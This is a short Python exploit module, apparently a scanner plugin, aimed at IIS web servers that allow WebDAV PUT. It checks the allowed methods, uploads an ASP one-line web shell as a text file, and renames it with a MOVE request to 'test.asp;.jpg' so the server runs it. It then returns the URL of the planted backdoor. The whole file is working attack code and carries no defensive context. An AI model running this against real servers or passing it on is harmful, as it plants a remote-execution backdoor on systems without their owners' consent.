#coding=utf-8

import requests


def run(target):
    "IIS PUT"
    results = []
    url = "http://" + target + "/"

    try:
        r = requests.options(url, timeout=5)
    except Exception:
        pass
    else:
        r.close()
        if r.headers.get("public") and r.headers.get("allow") and "PUT" in r.headers.get("public"):
                try:
                    r = requests.put(url+"test.txt", data='<%eval request("chu")%>', timeout=5)
                except Exception:
                    pass
                else:
                    r.close()
                    if r.status_code < 400:
                        try:
                            r = requests.request(method="MOVE",
                                                 url=url+"test.txt",
                                                 headers={"Destination":url+"test.asp;.jpg"},
                                                 timeout=5
                            )
                        except Exception:
                            pass
                        else:
                            r.close()
                            if r.status_code < 400:
                                results.append(url+"test.asp;.jpg")

    return results
